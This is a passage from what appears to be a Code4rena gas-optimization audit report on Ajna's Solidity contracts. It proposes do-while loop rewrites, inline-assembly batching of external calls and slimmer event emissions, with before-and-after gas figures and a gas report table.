*Gas Savings for `PositionManager.reedemPositions`, obtained via protocol's tests: Avg 44 gas*

|        |    Max   |
| ------ | -------- |
| Before |  139811  |  
| After  |  139767  | 

```solidity
File: ajna-core/src/PositionManager.sol
364:        for (uint256 i = 0; i < indexesLength; ) {
365:            index = params_.indexes[i];
366:
367:
...
379:            // remove LP tracked by position manager at bucket index
380:            delete positions[params_.tokenId][index];
381:
382:            unchecked { ++i; }
383:        }
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..eeb4f44 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -360,8 +360,9 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         uint256[] memory lpAmounts = new uint256[](indexesLength);

         uint256 index;
-
-        for (uint256 i = 0; i < indexesLength; ) {
+
+        uint256 i;
+        do {
             index = params_.indexes[i];

             Position memory position = positions[params_.tokenId][index];
@@ -380,7 +381,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
             delete positions[params_.tokenId][index];

             unchecked { ++i; }
-        }
+        } while(i < indexesLength);

         address owner = ownerOf(params_.tokenId);
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L62-L65

*Gas Savings for `GrantFund.executeExtraordinary`, obtained via protocol's tests: Avg 47 gas*

|        |    Max   |
| ------ | -------- |
| Before |   95823  |  
| After  |   95776  | 

```solidity
File: ajna-grants/src/grants/base/Funding.sol
62:        for (uint256 i = 0; i < targets_.length; ++i) {
63:            (bool success, bytes memory returndata) = targets_[i].call{value: values_[i]}(calldatas_[i]);
64:            Address.verifyCallResult(success, returndata, errorMessage);
65:        }
```
```diff
diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol
index 72fafb9..37bd3fb 100644
--- a/src/grants/base/Funding.sol
+++ b/src/grants/base/Funding.sol
@@ -59,10 +59,12 @@ abstract contract Funding is IFunding, ReentrancyGuard {
         emit ProposalExecuted(proposalId_);

         string memory errorMessage = "Governor: call reverted without message";
-        for (uint256 i = 0; i < targets_.length; ++i) {
+        uint256 i;
+        do {
             (bool success, bytes memory returndata) = targets_[i].call{value: values_[i]}(calldatas_[i]);
             Address.verifyCallResult(success, returndata, errorMessage);
-        }
+            ++i;
+        } while(i < targets_.length);
     }

      /**
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L112-L140

*Gas Savings for `GrantFund.proposeExtraordinary`, obtained via protocol's tests: Avg 44 gas*

|        |    Max   |
| ------ | -------- |
| Before |   86505  |  
| After  |   86461  | 

```solidity
File: ajna-grants/src/grants/base/Funding.sol
112:        for (uint256 i = 0; i < targets_.length;) {
113:
114:            // check targets and values params are valid
115:            if (targets_[i] != ajnaTokenAddress || values_[i] != 0) revert InvalidProposal();
116:
117:            // check calldata function selector is transfer()
118:            bytes memory selDataWithSig = calldatas_[i];
...
136:            // update tokens requested for additional calldata
137:            tokensRequested_ += SafeCast.toUint128(tokensRequested);
138:
139:            unchecked { ++i; }
140:        }
```
```diff
diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol
index 72fafb9..e9b3097 100644
--- a/src/grants/base/Funding.sol
+++ b/src/grants/base/Funding.sol
@@ -108,9 +108,9 @@ abstract contract Funding is IFunding, ReentrancyGuard {

         // check params have matching lengths
         if (targets_.length == 0 || targets_.length != values_.length || targets_.length != calldatas_.length) revert InvalidProposal();
-
-        for (uint256 i = 0; i < targets_.length;) {
-
+
+        uint256 i;
+        do {
             // check targets and values params are valid
             if (targets_[i] != ajnaTokenAddress || values_[i] != 0) revert InvalidProposal();

@@ -137,7 +137,7 @@ abstract contract Funding is IFunding, ReentrancyGuard {
             tokensRequested_ += SafeCast.toUint128(tokensRequested);

             unchecked { ++i; }
-        }
+        } while(i < targets_.length);
     }

     /**
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L434-L454

*Gas Savings for `GrantFund.updateSlate`, obtained via protocol's tests: Avg 167 gas*

|        |    Max   |
| ------ | -------- |
| Before |   318329 |  
| After  |   318162 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
434:        for (uint i = 0; i < numProposalsInSlate_; ) {
435:            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];
436:
437:            // check if Proposal is in the topTenProposals list
438:            if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();
439:
440:            // account for fundingVotesReceived possibly being negative
441:            if (proposal.fundingVotesReceived < 0) revert InvalidProposalSlate();
442:
443:            // update counters
444:            sum_ += uint128(proposal.fundingVotesReceived); // since we are converting from int128 to uint128, we can safely assume that the value will not overflow
445:            totalTokensRequested += proposal.tokensRequested;
446:
447:            // check if slate of proposals exceeded budget constraint ( 90% of GBC )
448:            if (totalTokensRequested > (gbc * 9 / 10)) {
449:                revert InvalidProposalSlate();
450:            }
451:
452:            unchecked { ++i; }
453:        }
454:    }
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..17c47e8 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -431,7 +431,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint256 totalTokensRequested = 0;

         // check each proposal in the slate is valid
-        for (uint i = 0; i < numProposalsInSlate_; ) {
+        uint256 i;
+        do {
             Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];

             // check if Proposal is in the topTenProposals list
@@ -450,7 +451,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
             }

             unchecked { ++i; }
-        }
+        } while(i < numProposalsInSlate_);
     }

     /**
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L549-L568

*Gas Savings for `GrantFund.fundingVote`, obtained via protocol's tests: Avg 111 gas*

|        |    Max   |
| ------ | -------- |
| Before |   409345 |  
| After  |   409234 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
549:        for (uint256 i = 0; i < numVotesCast; ) {
550:            Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];
551:
552:            // check that the proposal is part of the current distribution period
553:            if (proposal.distributionId != currentDistributionId) revert InvalidVote();
554:
555:            // check that the proposal being voted on is in the top ten screened proposals
556:            if (_findProposalIndex(voteParams_[i].proposalId, _topTenProposals[currentDistributionId]) == -1) revert InvalidVote();
557:
558:            // cast each successive vote
559:            votesCast_ += _fundingVote(
560:                currentDistribution,
561:                proposal,
562:                msg.sender,
563:                voter,
564:                voteParams_[i]
565:            );
566:
567:            unchecked { ++i; }
568:        }
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..9dcab1a 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -545,8 +545,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         }

         uint256 numVotesCast = voteParams_.length;
-
-        for (uint256 i = 0; i < numVotesCast; ) {
+
+        uint256 i;
+        do {
             Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];

             // check that the proposal is part of the current distribution period
@@ -565,7 +566,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
             );

             unchecked { ++i; }
-        }
+        } while(i < numVotesCast);
     }

     /// @inheritdoc IStandardFunding
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L582-L595

*Gas Savings for `GrantFund.screeningVote`, obtained via protocol's tests: Avg 167 gas*

|        |    Max   |
| ------ | -------- |
| Before |   399146 |  
| After  |   398979 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
582:        for (uint256 i = 0; i < numVotesCast; ) {
583:            Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];
584:
585:            // check that the proposal is part of the current distribution period
586:            if (proposal.distributionId != currentDistribution.id) revert InvalidVote();
587:
588:            uint256 votes = voteParams_[i].votes;
589:
590:            // cast each successive vote
591:            votesCast_ += votes;
592:            _screeningVote(msg.sender, proposal, votes);
593:
594:            unchecked { ++i; }
595:        }
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..649df77 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -578,8 +578,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         if (block.number < currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();

         uint256 numVotesCast = voteParams_.length;
-
-        for (uint256 i = 0; i < numVotesCast; ) {
+
+        uint256 i;
+        do {
             Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];

             // check that the proposal is part of the current distribution period
@@ -592,7 +593,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
             _screeningVote(msg.sender, proposal, votes);

             unchecked { ++i; }
-        }
+        } while(i < numVotesCast);
     }

     /*********************************/
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L848-L852

*Gas Savings for `GrantFund.fundingVote`, obtained via protocol's tests: Avg 456 gas*

|        |    Max   |
| ------ | -------- |
| Before |   409345 |  
| After  |   408889 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
848:        for (uint256 i = 0; i < numVotesCast; ) {
849:            votesCastSumSquared_ += Maths.wpow(SafeCast.toUint256(Maths.abs(votesCast_[i].votesUsed)), 2);
850:
851:            unchecked { ++i; }
852:        }
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..188e3db 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -844,12 +844,13 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         FundingVoteParams[] memory votesCast_
     ) internal pure returns (uint256 votesCastSumSquared_) {
         uint256 numVotesCast = votesCast_.length;
-
-        for (uint256 i = 0; i < numVotesCast; ) {
+
+        uint256 i;
+        do {
             votesCastSumSquared_ += Maths.wpow(SafeCast.toUint256(Maths.abs(votesCast_[i].votesUsed)), 2);

             unchecked { ++i; }
-        }
+        } while(i < numVotesCast);
     }

     /**
```


https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L208-L214

*Gas Savings for `GrantFund.startNewDistributionPeriod`, obtained via protocol's tests: Avg 82 gas*

|        |    Max   |
| ------ | -------- |
| Before |   75597  |  
| After  |   75515  | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
208:        for (uint i = 0; i < numFundedProposals; ) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..7e2d7db 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -204,14 +204,15 @@ abstract contract StandardFunding is Funding, IStandardFunding {

         uint256 totalTokensRequested;
         uint256 numFundedProposals = fundingProposalIds.length;
-
-        for (uint i = 0; i < numFundedProposals; ) {
+
+        uint256 i;
+        do {
             Proposal memory proposal = _standardFundingProposals[fundingProposalIds[i]];

             totalTokensRequested += proposal.tokensRequested;

             unchecked { ++i; }
-        }
+        } while(i < numFundedProposals);

         // readd non distributed tokens to the treasury
         treasury += (fundsAvailable - totalTokensRequested);
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L324-L330

*Gas Savings for `GrantFund.updateSlate`, obtained via protocol's tests: Avg 167 gas*

|        |    Max   |
| ------ | -------- |
| Before |   318329  |  
| After  |   318162  | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
324:            for (uint i = 0; i < numProposalsInSlate; ) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..67bee79 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -320,14 +320,14 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         // if slate of proposals is new top slate, update state
         if (newTopSlate_) {
             uint256[] storage existingSlate = _fundedProposalSlates[newSlateHash];
-
-            for (uint i = 0; i < numProposalsInSlate; ) {
-
+
+            uint256 i;
+            do {
                 // update list of proposals to fund
                 existingSlate.push(proposalIds_[i]);

                 unchecked { ++i; }
-            }
+            } while(i < numProposalsInSlate);

             // update hash to point to the new leading slate of proposals
             currentDistribution.fundedSlateHash = newSlateHash;
```

## [G-10] Use assembly to perform efficient back-to-back calls
If a similar external call is performed back-to-back, we can use assembly to reuse any function signatures and function parameters that stay the same. In addition, we can also reuse the same memory space for each function call (`scratch space` + `free memory pointer` + `zero slot`), which can potentially allow us to avoid memory expansion costs.

**Note: In order to do this optimization safely we will cache the free memory pointer value and restore it once we are done with our function calls. We will also set the zero slot back to 0 if neccessary**.

Total Instances: `3`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L636-L651

*Gas Savings for `RewardsManager.claimRewards`, obtained via protocol's tests: 2141 gas*

|        |    Max   |
| ------ | -------- |
| Before |  393064  |  
| After  |  390923  | 

```solidity
File: ajna-core/src/RewardsManager.sol
636:    function _getPoolAccumulators(
637:        address pool_,
638:        uint256 currentBurnEventEpoch_,
639:        uint256 lastBurnEventEpoch_
640:    ) internal view returns (uint256, uint256, uint256) {
641:        (
642:            uint256 currentBurnTime,
643:            uint256 totalInterestLatest,
644:            uint256 totalBurnedLatest
645:        ) = IPool(pool_).burnInfo(currentBurnEventEpoch_);
646:
647:        (
648:            ,
649:            uint256 totalInterestAtBlock,
650:            uint256 totalBurnedAtBlock
651:        ) = IPool(pool_).burnInfo(lastBurnEventEpoch_);
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..1d95b55 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -638,18 +638,30 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         uint256 currentBurnEventEpoch_,
         uint256 lastBurnEventEpoch_
     ) internal view returns (uint256, uint256, uint256) {
-        (
-            uint256 currentBurnTime,
-            uint256 totalInterestLatest,
-            uint256 totalBurnedLatest
-        ) = IPool(pool_).burnInfo(currentBurnEventEpoch_);
-
-        (
-            ,
-            uint256 totalInterestAtBlock,
-            uint256 totalBurnedAtBlock
-        ) = IPool(pool_).burnInfo(lastBurnEventEpoch_);
-
+        uint256 currentBurnTime;
+        uint256 totalInterestLatest;
+        uint256 totalBurnedLatest;
+        uint256 totalInterestAtBlock;
+        uint256 totalBurnedAtBlock;
+        assembly {
+            let memptr := mload(0x40)
+
+            mstore(0x00, 0x2c7b2e06)
+            mstore(0x20, currentBurnEventEpoch_)
+            if iszero(staticcall(gas(), pool_, 0x1c, 0x24, 0x00, 0x60)) {revert(0, 0)}
+            currentBurnTime := mload(0x00)
+            totalInterestLatest := mload(0x20)
+            totalBurnedLatest := mload(0x40)
+
+            mstore(0x00, 0x2c7b2e06)
+            mstore(0x20, lastBurnEventEpoch_)
+            if iszero(staticcall(gas(), pool_, 0x1c, 0x24, 0x00, 0x60)) {revert(0, 0)}
+            totalInterestAtBlock := mload(0x20)
+            totalBurnedAtBlock := mload(0x40)
+
+            mstore(0x40, memptr)
+        }
+
         uint256 totalBurned   = totalBurnedLatest   != 0 ? totalBurnedLatest   - totalBurnedAtBlock   : totalBurnedAtBlock;
         uint256 totalInterest = totalInterestLatest != 0 ? totalInterestLatest - totalInterestAtBlock : totalInterestAtBlock;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L416-L427

*Gas Savings for `PositionManager.mint`, obtained via protocol's tests: 1223 gas*

|        |    Max   |
| ------ | -------- |
| Before |  98876   |  
| After  |  97653   | 

```solidity
File: ajna-core/src/PositionManager.sol
416:    function _isAjnaPool(
417:        address pool_,
418:        bytes32 subsetHash_
419:    ) internal view returns (bool) {
420:        address collateralAddress = IPool(pool_).collateralAddress();
421:        address quoteAddress      = IPool(pool_).quoteTokenAddress();
422:
423:        address erc20DeployedPoolAddress  = erc20PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);
424:        address erc721DeployedPoolAddress = erc721PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);
425:
426:        return (pool_ == erc20DeployedPoolAddress || pool_ == erc721DeployedPoolAddress);
427:    }
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..58d1a6a 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -417,11 +417,26 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         address pool_,
         bytes32 subsetHash_
     ) internal view returns (bool) {
-        address collateralAddress = IPool(pool_).collateralAddress();
-        address quoteAddress      = IPool(pool_).quoteTokenAddress();
-
-        address erc20DeployedPoolAddress  = erc20PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);
-        address erc721DeployedPoolAddress = erc721PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);
+        address erc20DeployedPoolAddress;
+        address erc721DeployedPoolAddress;
+        ERC20PoolFactory _erc20Pool = erc20PoolFactory;
+        ERC721PoolFactory _erc721Pool = erc721PoolFactory;
+        assembly {
+            let memptr := mload(0x40)
+            let active_mem := mload(0x80)
+            // function sigs for `collateralAddress()` + `quoteTokenAddress()` + `deployedPools(bytes32,address,address)`
+            mstore(0x00, 0x48d399e7bad346207f165b0b)
+            if iszero(staticcall(gas(), pool_, 0x14, 0x04, 0x40, 0x20)) {revert(0, 0)}
+            if iszero(staticcall(gas(), pool_, 0x18, 0x04, 0x60, 0x20)) {revert(0, 0)}
+            mstore(0x20, subsetHash_)
+            if iszero(staticcall(gas(), _erc20Pool, 0x1c, 0x64, 0x80, 0x20)) {revert(0, 0)}
+            erc20DeployedPoolAddress := mload(0x80)
+            if iszero(staticcall(gas(), _erc721Pool, 0x1c, 0x64, 0x80, 0x20)) {revert(0, 0)}
+            erc721DeployedPoolAddress := mload(0x80)
+            mstore(0x40, memptr)
+            mstore(0x60, 0x00)
+            mstore(0x80, active_mem)
+        }

         return (pool_ == erc20DeployedPoolAddress || pool_ == erc721DeployedPoolAddress);
     }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L76-L93

*Gas Savings for `GrantFund.getVotesFunding`, obtained via protocol's tests: 421 gas*

|        |    Max   |
| ------ | -------- |
| Before |   11518  |  
| After  |   11097  | 

```solidity
File: ajna-grants/src/grants/base/Funding.sol
76:    function _getVotesAtSnapshotBlocks(
77:        address account_,
78:        uint256 snapshot_,
79:        uint256 voteStartBlock_
80:    ) internal view returns (uint256) {
81:        IVotes token = IVotes(ajnaTokenAddress);
82:
83:        // calculate the number of votes available at the snapshot block
84:        uint256 votes1 = token.getPastVotes(account_, snapshot_);
85:
86:        // enable voting weight to be calculated during the voting period's start block
87:        voteStartBlock_ = voteStartBlock_ != block.number ? voteStartBlock_ : block.number - 1;
88:
89:        // calculate the number of votes available at the stage's start block
90:        uint256 votes2 = token.getPastVotes(account_, voteStartBlock_);
91:
92:        return Maths.min(votes2, votes1);
93:    }
```
```diff
diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol
index 72fafb9..4bafbcb 100644
--- a/src/grants/base/Funding.sol
+++ b/src/grants/base/Funding.sol
@@ -79,15 +79,37 @@ abstract contract Funding is IFunding, ReentrancyGuard {
         uint256 voteStartBlock_
     ) internal view returns (uint256) {
         IVotes token = IVotes(ajnaTokenAddress);
+
+        uint256 votes1;
+        uint256 votes2;
+        assembly {
+            let memptr := mload(0x40)
+
+            mstore(0x00, 0x3a46b1a8)
+            mstore(0x20, account_)
+            mstore(0x40, snapshot_)
+
+            let success1 := staticcall(gas(), token, 0x1c, 0x44, 0x40, 0x20)
+            if iszero(success1) {
+                revert(0, 0)
+            }
+            votes1 := mload(0x40)
+            for {} 1 {} {
+                if iszero(eq(voteStartBlock_, number())) {
+                    break
+                }
+                voteStartBlock_ := sub(number(), 1)
+                break
+            }
+            mstore(0x40, voteStartBlock_)
+            let success2 := staticcall(gas(), token, 0x1c, 0x44, 0x40, 0x20)
+            if iszero(success2) {
+                revert(0, 0)
+            }
+            votes2 := mload(0x40)

-        // calculate the number of votes available at the snapshot block
-        uint256 votes1 = token.getPastVotes(account_, snapshot_);
-
-        // enable voting weight to be calculated during the voting period's start block
-        voteStartBlock_ = voteStartBlock_ != block.number ? voteStartBlock_ : block.number - 1;
-
-        // calculate the number of votes available at the stage's start block
-        uint256 votes2 = token.getPastVotes(account_, voteStartBlock_);
+            mstore(0x40, memptr)
+        }
```

## [G-11] Refactor event to avoid emitting data that is already present in transaction data
In the instance below, `startBlock` (`block.timestammp`), does not have to be emitted since the timestamp is already present in the transaction data. In addition, `endBlock` (`block.timetamp` + `DISTRIBUTION_PERIOD_LENGTH`), does not have to be emitted either since `DISTRIBUTION_PERIOD_LENGTH` is a constant and therefore the `endBlock` can always be trivially calculated. This would save loading data into memory (potentially avoiding memory expansion costs) and `Glogdata (8 gas) * bytes emitted`.

**Note: Additional refactoring of the tests is needed for this optimization to work and therefore it is not included in the final diffs**.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L159-L163

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
159:        emit QuarterlyDistributionStarted(
160:            newDistributionId_,
161:            startBlock, // @audit: present in tx data
162:            endBlock // @audit: can be trivially calculated
163:        );
```

In the instances below, `block.number` is being emitted as well.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L113-L123

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L393-L403

```solidity
File: ajna-grants/src/grants/base/ExtraordinaryFunding.sol
113:        emit ProposalCreated(
114:            proposalId_,
115:            msg.sender,
116:            targets_,
117:            values_,
118:            new string[](targets_.length),
119:            calldatas_,
120:            block.number, // @audit: present in tx data
121:            endBlock_,
122:            description_
123:        );
```
```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
393:        emit ProposalCreated(
394:            proposalId_,
395:            msg.sender,
396:            targets_,
397:            values_,
398:            new string[](targets_.length),
399:            calldatas_,
400:            block.number, // @audit: present in tx data
401:            currentDistribution.endBlock,
402:            description_
403:        );
```

## [G-12] Refactor event to avoid emitting empty data
The instances below show the only time the `VoteCast` event is emitted. Each time, the `reason` parameter is empty. We can therefore refactor the event to opt out of emitting an emtpy string since it does not contain data. 

**Note: Additional refactoring of the tests is needed for this optimization to work and therefore it is not included in the final diffs**

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IFunding.sol#L69

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L150-L156

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L683-L689

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L746-L752

```solidity
File: ajna-grants/src/grants/interfaces/IFunding.sol
69:    event VoteCast(address indexed voter, uint256 proposalId, uint8 support, uint256 weight, string reason);
```
```solidity
File: ajna-grants/src/grants/base/ExtraordinaryFunding.sol
150:        emit VoteCast(
151:            msg.sender,
152:            proposalId_,
153:            1,
154:            votesCast_,
155:            "" // @audit: no data emitted
156:        );
```
```solidity
File: ajna-grants/src/grants/base/ExtraordinaryFunding.sol
683:        emit VoteCast(
684:            account_,
685:            proposalId,
686:            support,
687:            incrementalVotesUsed_,
688:            "" // @audit: no data emitted
689:        );

746:        emit VoteCast(
747:            account_,
748:            proposalId,
749:            1,
750:            votes_,
751:            "" // @audit: no data emitted
752:        );
```
The instances below show the only times the `ProposalCreatedEvent` is emitted. Each time, an emtpy array of type `string`, with a size of `targets_.length`, is emitted. This array does not contain any meaningful data and we can therefore refactor the event to opt out of creating an empty array in memory (potentially incurring memory expansion costs) and emitting an empty array.

**Note: Additional refactoring of the tests is needed for this optimization to work and therefore it is not included in the final diffs**

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IFunding.sol#L54-L64

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L113-L123

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L393-L403

```solidity
File: ajna-grants/src/grants/interfaces/IFunding.sol
54:    event ProposalCreated(
55:        uint256 proposalId,
56:        address proposer,
57:        address[] targets,
58:        uint256[] values,
59:        string[] signatures,
60:        bytes[] calldatas,
61:        uint256 startBlock,
62:        uint256 endBlock,
63:        string description
64:    );
```
```solidity
File: ajna-grants/src/grants/base/ExtraordinaryFunding.sol
113:        emit ProposalCreated(
114:            proposalId_,
115:            msg.sender,
116:            targets_,
117:            values_,
118:            new string[](targets_.length), // @audit: no data is emitted
119:            calldatas_,
120:            block.number,
121:            endBlock_,
122:            description_
123:        );
```
```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
393:        emit ProposalCreated(
394:            proposalId_,
395:            msg.sender,
396:            targets_,
397:            values_,
398:            new string[](targets_.length), // @audit: no data is emitted
399:            calldatas_,
400:            block.number,
401:            currentDistribution.endBlock,
402:            description_
403:        );
```

## [G-13] Sort array offchain to check duplicates in O(n) instead of O(n^2)
Instead of using two for loops to check for duplicates, which runs in O(n^2) time and is expensive, the `proposalIds_` array can be sorted offchain which allows us to to check duplicates by simply ensuring the the current `id` is larger than the previous one (O(n) time).

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L463-L479

```solidity
File: ajna-grants/src/base/StandardFunding.sol
463:    function _hasDuplicates(
464:        uint256[] calldata proposalIds_
465:    ) internal pure returns (bool) {
466:        uint256 numProposals = proposalIds_.length;
467:
468:        for (uint i = 0; i < numProposals; ) {
469:            for (uint j = i + 1; j < numProposals; ) {
470:                if (proposalIds_[i] == proposalIds_[j]) return true;
471:
472:                unchecked { ++j; }
473:            }
474:
475:            unchecked { ++i; }
476:
477:        }
478:        return false;
479:    }
```

## `GasReport` output with all optimizations applied
```js
| src/grants/GrantFund.sol:GrantFund contract |                 |        |        |        |         |
|---------------------------------------------|-----------------|--------|--------|--------|---------|
| Deployment Cost                             | Deployment Size |        |        |        |         |
| 4584527                                     | 22888           |        |        |        |         |
| Function Name                               | min             | avg    | median | max    | # calls |
| claimDelegateReward                         | 1027            | 34814  | 35468  | 42268  | 237     |
| executeExtraordinary                        | 7234            | 38968  | 39686  | 95707  | 11      |
| executeStandard                             | 8598            | 29854  | 37920  | 47520  | 8       |
| findMechanismOfProposal                     | 613             | 2043   | 799    | 4719   | 3       |
| fundTreasury                                | 7917            | 45019  | 44557  | 65788  | 29      |
| fundingVote                                 | 1162            | 104626 | 104616 | 396776 | 252     |
| getDelegateReward                           | 1909            | 1909   | 1909   | 1909   | 5       |
| getDistributionId                           | 368             | 417    | 368    | 2368   | 601     |
| getDistributionPeriodInfo                   | 1023            | 1802   | 1023   | 5023   | 77      |
| getExtraordinaryProposalInfo                | 992             | 992    | 992    | 992    | 4       |
| getExtraordinaryProposalSucceeded           | 2245            | 2664   | 2740   | 3008   | 3       |
| getFundedProposalSlate                      | 1155            | 1331   | 1390   | 1390   | 4       |
| getFundingPowerVotes                        | 15522           | 15710  | 15773  | 15773  | 4       |
| getFundingVotesCast                         | 1576            | 2316   | 2316   | 3056   | 2       |
| getMinimumThresholdPercentage               | 471             | 629    | 471    | 2471   | 16      |
| getProposalInfo                             | 1002            | 1002   | 1002   | 1002   | 110     |
| getSlateHash                                | 922             | 930    | 934    | 934    | 3       |
| getSliceOfNonTreasury                       | 1577            | 3743   | 1577   | 8077   | 3       |
| getSliceOfTreasury                          | 781             | 1781   | 1781   | 2781   | 2       |
| getTopTenProposals                          | 1209            | 2473   | 2385   | 3326   | 16      |
| getVoterInfo                                | 1002            | 1002   | 1002   | 1002   | 5       |
| getVotesExtraordinary                       | 764             | 7180   | 7192   | 8334   | 880     |
| getVotesFunding                             | 1250            | 4511   | 1250   | 8366   | 15      |
| getVotesScreening                           | 4892            | 4934   | 4926   | 6068   | 489     |
| hasVotedExtraordinary                       | 683             | 1683   | 1683   | 2683   | 2       |
| hashProposal                                | 3685            | 3685   | 3685   | 3685   | 76      |
| proposeExtraordinary                        | 4725            | 63262  | 82112  | 86451  | 18      |
| proposeStandard                             | 4418            | 77911  | 82820  | 82820  | 72      |
| screeningVote                               | 1456            | 44406  | 38748  | 390626 | 271     |
| screeningVotesCast                          | 695             | 1361   | 695    | 2695   | 3       |
| startNewDistributionPeriod                  | 576             | 48177  | 52813  | 75139  | 20      |
| state                                       | 1337            | 4346   | 3685   | 7137   | 20      |
| treasury                                    | 396             | 396    | 396    | 396    | 12      |
| updateSlate                                 | 971             | 57418  | 69517  | 310231 | 17      |
| voteExtraordinary                           | 590             | 28832  | 28927  | 30893  | 877     |


| src/PositionManager.sol:PositionManager contract |                 |        |        |         |         |
|--------------------------------------------------|-----------------|--------|--------|---------|---------|
| Deployment Cost                                  | Deployment Size |        |        |         |         |
| 3848238                                          | 19497           |        |        |         |         |
| Function Name                                    | min             | avg    | median | max     | # calls |
| DOMAIN_SEPARATOR                                 | 512             | 512    | 512    | 512     | 7       |
| PERMIT_TYPEHASH                                  | 241             | 241    | 241    | 241     | 7       |
| approve(address,uint256)                         | 25186           | 25186  | 25186  | 25186   | 10      |
| approve(address,uint256)(bool)                   | 25186           | 25186  | 25186  | 25186   | 28      |
